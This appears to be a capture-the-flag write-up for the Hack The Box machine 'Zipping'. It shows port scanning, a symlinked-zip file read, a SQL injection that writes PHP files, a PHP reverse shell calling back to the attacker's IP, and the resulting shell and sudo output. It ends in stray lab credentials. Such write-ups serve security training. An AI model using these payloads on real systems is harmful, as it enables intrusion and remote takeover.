# #1 Introduction
![image](https://github.com/Mate0r/app.hackthebock.com/assets/94843357/4cf7f881-56aa-4262-a3b0-2f436a100a2e)

# #2 nmap

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx zipping.htb
```

we run an nmap scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -sV -p- zipping.htb
```

we got these open ports
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# #3 user.txt

## HTTP (port 80)

by fuzzing the website with feroxbuster, we identify all these urls : 
```
http://zipping.htb/upload.php \
http://zipping.htb/shop \
http://zipping.htb/uploads \
http://zipping.htb/shop/functions.php \
http://zipping.htb/shop/home.php \
http://zipping.htb/index.php \
http://zipping.htb/shop/placeorder.php \
http://zipping.htb/shop/product.php \
http://zipping.htb/shop/products.php \
http://zipping.htb/shop/cart.php \
```

we found in upload.php that we can upload zip and use a vulnerability that allow us to arbitrary read files on the server
```
ln -s /var/www/html/shop/product.php cv.pdf
zip cv.zip cv.pdf
```

by downloading the files of the shop application, we found there is some sqli \
we can use this payload to bypass the preg_match function (https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#preg_match-.) \
in this payload, we will write a file by mysql (so we have user mysql) that can write in /var/lib/mysql/
```

';select '<?php phpinfo(); ?>' into outfile '/var/lib/mysql/test.php';--2
```

we encode this for url 
```
%0A%27%3Bselect%20%27%3C%3Fphp%20phpinfo%28%29%3B%20%3F%3E%27%20into%20outfile%20%27%2Fvar%2Flib%2Fmysql%2Ftest.php%27%3B--2
```

so we have the final url that should create a test.php file that give us a phpinfo in the /shop/ directory
```
http://zipping.htb/shop/index.php?page=product&id=%0A%27%3Bselect%20%27%3C%3Fphp%20phpinfo%28%29%3B%20%3F%3E%27%20into%20outfile%20%27%2Fvar%2Flib%2Fmysql%2Ftest.php%27%3B--2
```

<img width="1160" alt="image" src="https://github.com/Mate0r/app.hackthebock.com/assets/94843357/ab6732bf-14aa-4d99-8058-b584a0db0794">


so let's now do a reverse shell 
```

';select "<?php $sock=fsockopen('10.10.14.186',6666);$proc=proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>" into outfile "/var/lib/mysql/revshell.php";--2
```

```
http://zipping.htb/shop/index.php?page=product&id=%0A%27%3Bselect%20%22%3C%3Fphp%20%24sock%3Dfsockopen%28%2710.10.14.186%27%2C6666%29%3B%24proc%3Dproc_open%28%27%2Fbin%2Fsh%20-i%27%2C%20array%280%3D%3E%24sock%2C%201%3D%3E%24sock%2C%202%3D%3E%24sock%29%2C%24pipes%29%3B%20%3F%3E%22%20into%20outfile%20%22%2Fvar%2Flib%2Fmysql%2Frevshell.php%22%3B--2
```


we got a reverse shell now
```
┌──(parallels㉿kali)-[~/hacking/htb/Zipping/files]
└─$ nc -lvnp 6666
listening on [any] 6666 ...
connect to [10.10.14.186] from (UNKNOWN) [10.10.11.229] 48198
/bin/sh: 0: can't access tty; job control turned off
$
```

we found we have some authorizations with sudo
```
rektsu@zipping:/usr/bin$ sudo -l
Matching Defaults entries for rektsu on zipping:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User rektsu may run the following commands on zipping:
    (ALL) NOPASSWD: /usr/bin/stock
```

St0ckM4nager


$DATABASE_HOST = 'localhost';
    $DATABASE_USER = 'root';
    $DATABASE_PASS = 'MySQL_P@ssw0rd!';
    $DATABASE_NAME = 'zipping';
